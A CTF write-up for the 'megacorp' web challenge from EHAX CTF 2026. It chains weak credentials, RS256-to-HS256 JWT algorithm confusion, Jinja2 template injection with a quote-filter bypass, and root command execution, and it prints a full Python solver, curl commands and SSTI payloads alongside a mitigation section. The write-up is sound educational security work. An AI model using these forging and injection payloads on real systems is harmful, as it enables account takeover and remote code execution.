---
title: "[Web] megacorp"
description: Writeup for "megacorp" from EHAX CTF 2026.
date: 2026-03-01 09:00:00 +0900
categories: [CTF, EHAX CTF 2026]
tags: [Web]
toc: true
comments: false
---

# megacorp (EHAX CTF 2026)

---

- **Name:** megacorp
- **Category:** Web
- **Difficulty:** ‚òÖ‚òÖ‚òÖ‚òÜ‚òÜ

---

## TL;DR

Login as `alice:password123` ‚Üí Find RSA public key at `/pubkey` ‚Üí Forge admin JWT using **RS256-to-HS256 algorithm confusion** ‚Üí Exploit **SSTI** in the profile bio field ‚Üí Achieve **RCE** as root ‚Üí Read the flag from the source code.

**Flag:** `EH4X{14mk1nd4high}`

---

## Overview

MEGACORP is a fake corporate portal built with **Flask** (Python). The app uses **JWT tokens** with RS256 for authentication. The challenge has three main stages:

1. **JWT Algorithm Confusion** ‚Äî Trick the server into accepting a forged token  
2. **SSTI (Server-Side Template Injection)** ‚Äî Inject code through the bio field  
3. **RCE (Remote Code Execution)** ‚Äî Run commands on the server to find the flag  

The flag is hidden inside the app's source code, returned via a simulated AWS metadata SSRF endpoint.

---

## Solution

### 1) Recon

The challenge URL is `http://chall.ehax.in:7801/`. We see a login page. Checking the HTML source, there's a hint:

```html
<!-- did you check for sql injection? just kidding, there is none here -->
```

The placeholder text says `alice`. So we try common passwords:

```bash
curl -X POST http://chall.ehax.in:7801/login \
  -d "username=alice&password=password123" -v
```

**Result:** `302 Redirect` ‚Üí Login works! We get a JWT cookie.

#### Understanding the JWT

After login, the server sets a cookie called `token`. Let's decode it:

```
Header:  {"alg": "RS256", "typ": "JWT"}
Payload: {"username": "alice", "role": "user"}
```

Key observations:

- The algorithm is **RS256** (RSA + SHA-256)
- Alice's role is `"user"` ‚Äî we need `"admin"` or `"sysadmin"`
- The signature is 256 bytes ‚Üí 2048-bit RSA key

#### Exploring the App

With alice's token, the profile page shows:

- **user-tag:** `employee_tier_1`
- **Network Fetcher:** locked (needs sysadmin)
- **System Logs:** locked
- **Vault Access:** locked
- **Bio field:** Accepts input but doesn't render templates (SSTI blocked for tier 1)

We also ran **ffuf** to find hidden paths:

```bash
ffuf -u http://chall.ehax.in:7801/FUZZ -w common.txt -mc all -fc 404
```

Only three endpoints exist: `/login`, `/profile`, `/fetch`.

But then we tried more paths manually, and found:

```
/pubkey ‚Üí 200 OK!
```

The server is **exposing its RSA public key**:

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsNmqnDkCDNBFWmWQ3ZsA
aYELW0TM1Ea746JjjojY8jq4psXnI00XOIjBI+q1xg0JYfpa6+m/zp4ZzeEw3/GX
...
-----END PUBLIC KEY-----
```

This is exactly what we need for the attack.

---

### 2) Root Cause ‚Äî Algorithm Confusion

#### How JWT Signing Normally Works

There are two types of JWT signing:

| Algorithm | How it signs | How it verifies |
|-----------|-------------|-----------------|
| **RS256** | Sign with **private key** | Verify with **public key** |
| **HS256** | Sign with **secret key** | Verify with **same secret key** |

The server uses RS256. It signs tokens with a private key (secret), and verifies them with the public key.

#### The Vulnerability

Many JWT libraries work like this internally:

```python
if algorithm == "RS256":
    verify(token, public_key)      # asymmetric
elif algorithm == "HS256":
    verify(token, secret_key)      # symmetric
```

But what if the **public key variable** is reused as the **secret key** for HS256?

If we change the JWT header from `RS256` to `HS256`, the server might do:

```python
# Server thinks: "Oh, it's HS256, let me verify with my key"
hmac_verify(token, public_key)  # Uses public key as HMAC secret!
```

Since **we have the public key** (from `/pubkey`), we can sign our own token with it!

---

### 3) Exploit

#### Step 1 ‚Äî Forge Admin JWT

We create a new JWT with `"alg": "HS256"` and `"role": "admin"`, signed using the public key as the HMAC secret:

```python
import hmac, hashlib, base64, json

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Read the public key from /pubkey
with open("pubkey.pem", "rb") as f:
    pubkey = f.read()

# Build the forged token
header = b64url_encode(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
payload = b64url_encode(json.dumps({"username":"alice","role":"admin"}).encode())
signing_input = f"{header}.{payload}".encode()
sig = b64url_encode(hmac.new(pubkey, signing_input, hashlib.sha256).digest())
forged_token = f"{header}.{payload}.{sig}"
```

Using this token:

```
user-tag: sysadmin_root   ‚úÖ
Network Fetcher: UNLOCKED  ‚úÖ
SSTI: ENABLED              ‚úÖ
```

#### Step 2 ‚Äî SSTI (Server-Side Template Injection)

Now the bio field renders Jinja2 templates. We confirm:

```
bio={{7*7}}  ‚Üí  49  ‚úÖ
bio={{'A'+'B'}}  ‚Üí  AB  ‚úÖ
```

We leak the Flask config:

```
bio={{config.items()|list}}
```

This reveals:

```
SECRET_KEY = 'megacorp#34af3afca3dad124zsxae'
```

#### Step 3 ‚Äî RCE (Remote Code Execution)

The server filters quotes (`"` and `'`) in SSTI payloads. Direct `os.popen("id")` fails. But we can bypass this using **`request.args`** to pass strings through URL parameters:

```bash
curl -b "token=$ADMIN_TOKEN" \
  -X POST "http://chall.ehax.in:7801/profile?m=subprocess&c=id" \
  --data-urlencode 'bio={{lipsum.__globals__.import_string(request.args.m).check_output(request.args.c,shell=True)}}'
```

**Result:**

```
b'uid=0(root) gid=0(root) groups=0(root)\n'
```

We have **root RCE**!

#### Step 4 ‚Äî Get the Flag

We read the app source code:

```
bio={{lipsum.__globals__.__builtins__.open(request.args.f).read()}}
```

With `?f=app.py`, the source reveals:

```python
if req_url == "http://169.254.169.254/latest/meta-data/flag":
    return b"EH4X{14mk1nd4high}"
```

The flag was hidden in a simulated AWS metadata endpoint, accessed through the `/fetch` SSRF feature.

We also found the API key in environment variables:

```
API_KEY=s3cr3t_fetch_k3y_for_adm1ns_only
```

---

### 4) Why It Works

The core vulnerability is **JWT Algorithm Confusion**, also known as **Key Confusion** or **Algorithm Substitution Attack**.

It works because:

1. **The server accepts both RS256 and HS256** ‚Äî It doesn't enforce a single algorithm
2. **The public key is accessible** ‚Äî Found at `/pubkey`
3. **The same key object is used for both algorithms** ‚Äî The server passes the RSA public key to the HMAC verification function when the token says "HS256"

In a properly configured server:

```python
# SAFE: Only accept the expected algorithm
jwt.decode(token, public_key, algorithms=["RS256"])
```

In the vulnerable server:

```python
# VULNERABLE: Accepts any algorithm the token claims
jwt.decode(token, public_key, algorithms=["RS256", "HS256"])
```

When the algorithm is HS256, `jwt.decode()` treats `public_key` as an HMAC secret. Since the attacker has the public key, they can forge any token.

**Mitigation:** Always hardcode the expected algorithm. Never trust the `alg` header in the token.

---

## Solver

Full exploit script:

```python
#!/usr/bin/env python3
"""eHax CTF 2026 - MEGACORP Solver"""

import hmac, hashlib, base64, json, http.client, urllib.parse

TARGET = "chall.ehax.in"
PORT = 7801

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def http_get(path, cookie=None):
    conn = http.client.HTTPConnection(TARGET, PORT)
    headers = {"Cookie": f"token={cookie}"} if cookie else {}
    conn.request("GET", path, headers=headers)
    r = conn.getresponse()
    body = r.read().decode(errors='ignore')
    conn.close()
    return r.status, body

def http_post(path, data, cookie=None, params=""):
    conn = http.client.HTTPConnection(TARGET, PORT)
    url = f"{path}?{params}" if params else path
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": f"token={cookie}" if cookie else ""
    }
    conn.request("POST", url, urllib.parse.urlencode(data), headers)
    r = conn.getresponse()
    body = r.read().decode(errors='ignore')
    cookie_header = r.getheader("Set-Cookie", "")
    conn.close()
    return r.status, body, cookie_header

# ========================================
# Step 1: Login as alice
# ========================================
print("[*] Step 1: Logging in as alice...")
status, body, cookie = http_post("/login", {
    "username": "alice",
    "password": "password123"
})
alice_token = cookie.split("token=")[1].split(";")[0]
print(f"[+] Got alice token: {alice_token[:50]}...")

# ========================================
# Step 2: Get the public key
# ========================================
print("[*] Step 2: Fetching public key...")
status, pubkey_pem = http_get("/pubkey")
pubkey_bytes = pubkey_pem.encode()
print(f"[+] Got public key ({len(pubkey_bytes)} bytes)")

# ========================================
# Step 3: Forge admin JWT (Algorithm Confusion)
# ========================================
print("[*] Step 3: Forging admin JWT with HS256...")
header = b64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
payload = b64url_encode(json.dumps({"username": "alice", "role": "admin"}).encode())
signing_input = f"{header}.{payload}".encode()
sig = b64url_encode(
    hmac.new(pubkey_bytes, signing_input, hashlib.sha256).digest()
)
admin_token = f"{header}.{payload}.{sig}"
print(f"[+] Forged admin token: {admin_token[:50]}...")

# Verify it works
status, body = http_get("/profile", admin_token)
assert "sysadmin_root" in body, "Token forging failed!"
print("[+] Verified: sysadmin_root access!")

# ========================================
# Step 4: SSTI ‚Üí RCE ‚Üí Read source code
# ========================================
print("[*] Step 4: Exploiting SSTI for RCE...")

# Use subprocess.check_output via import_string
# Bypass quote filter using request.args
ssti_payload = (
    "{{lipsum.__globals__.import_string(request.args.m)"
    ".check_output(request.args.c,shell=True)}}"
)

# Read app.py
status, body, _ = http_post(
    "/profile",
    {"bio": ssti_payload},
    cookie=admin_token,
    params="m=subprocess&c=cat+app.py"
)

# Extract flag from source
import re
flag_match = re.search(r'(EH4X\{[^}]+\})', body)
if flag_match:
    print(f"\n[üèÅ] FLAG: {flag_match.group(1)}")
else:
    # Try env vars
    status, body, _ = http_post(
        "/profile",
        {"bio": ssti_payload},
        cookie=admin_token,
        params="m=subprocess&c=env"
    )
    print("[*] Environment variables:")
    print(body[body.find("bio-display"):body.find("bio-display")+500])
```

---

## Attack Flow Summary

```
alice:password123 (weak creds)
       ‚îÇ
       ‚ñº
  JWT token (RS256, role: user)
       ‚îÇ
       ‚ñº
  /pubkey ‚Üí RSA public key leaked
       ‚îÇ
       ‚ñº
  Algorithm Confusion (RS256 ‚Üí HS256)
  Sign with public key ‚Üí role: admin
       ‚îÇ
       ‚ñº
  sysadmin_root access
       ‚îÇ
       ‚ñº
  SSTI in bio field ({{7*7}} = 49)
       ‚îÇ
       ‚ñº
  Quote filter bypass (request.args)
       ‚îÇ
       ‚ñº
  RCE as root (subprocess.check_output)
       ‚îÇ
       ‚ñº
  Read source code ‚Üí EH4X{14mk1nd4high}
```

---

## Result
<img width="837" height="170" alt="image" src="https://github.com/user-attachments/assets/79560150-8974-4f34-9fa7-62ba23841e06" />

---
